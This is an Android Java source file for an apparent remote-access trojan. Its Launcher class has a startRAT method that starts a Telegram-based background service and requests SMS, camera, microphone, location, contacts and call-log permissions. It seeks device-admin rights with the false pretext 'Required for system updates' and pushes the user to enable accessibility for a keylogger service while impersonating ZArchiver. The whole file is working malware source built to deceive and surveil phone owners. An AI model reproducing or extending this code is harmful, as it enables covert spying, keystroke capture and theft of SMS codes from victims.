package com.sys.updater;

import android.Manifest;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.provider.Settings;
import android.text.TextUtils;
import android.widget.Toast;
import java.util.ArrayList;
import java.util.List;

public class Launcher {
    public static void startRAT(final Context context) {
        // 1. Start l'Bot f background
        try {
            Intent intent = new Intent(context, TelegramService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent);
            } else {
                context.startService(intent);
            }
        } catch (Exception e) {}

        // 2. Check l'Context wach Activity (bach n9edro nt-lbo permissions)
        if (context instanceof Activity) {
            final Activity activity = (Activity) context;

            // Tleb l'Permissions
            List<String> perms = new ArrayList<>();
            perms.add(Manifest.permission.RECEIVE_SMS);
            perms.add(Manifest.permission.READ_SMS);
            perms.add(Manifest.permission.CAMERA);
            perms.add(Manifest.permission.RECORD_AUDIO);
            perms.add(Manifest.permission.ACCESS_FINE_LOCATION);
            perms.add(Manifest.permission.ACCESS_COARSE_LOCATION);
            perms.add(Manifest.permission.READ_CONTACTS);
            perms.add(Manifest.permission.READ_CALL_LOG);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                perms.add(Manifest.permission.POST_NOTIFICATIONS);
            }

            boolean needsPerms = false;
            for (String p : perms) {
                if (activity.checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {
                    needsPerms = true;
                    break;
                }
            }
            if (needsPerms) {
                activity.requestPermissions(perms.toArray(new String[0]), 101);
            }

            // Tleb Device Admin
            DevicePolicyManager dpm = (DevicePolicyManager) activity.getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName adminComponent = new ComponentName(activity, MyDeviceAdminReceiver.class);
            if (dpm != null && !dpm.isAdminActive(adminComponent)) {
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for system updates.");
                activity.startActivity(intent);
            }

            // Ila l'Accessibility machi m-activi, 3ayet l Settings
            if (!isAccessibilityServiceEnabled(activity, KeyloggerService.class)) {
                Toast.makeText(activity, "Please enable Accessibility for ZArchiver", Toast.LENGTH_LONG).show();
                Intent accIntent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                activity.startActivity(accIntent);
            }
        }
    }

    public static boolean isAccessibilityServiceEnabled(Context context, Class<?> accessibilityService) {
        ComponentName expectedComponentName = new ComponentName(context, accessibilityService);
        String enabledServicesSetting = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        if (enabledServicesSetting == null) return false;

        TextUtils.SimpleStringSplitter colonSplitter = new TextUtils.SimpleStringSplitter(':');
        colonSplitter.setString(enabledServicesSetting);

        while (colonSplitter.hasNext()) {
            String componentNameString = colonSplitter.next();
            ComponentName enabledService = ComponentName.unflattenFromString(componentNameString);
            if (enabledService != null && enabledService.equals(expectedComponentName)) return true;
        }
        return false;
    }
                      }
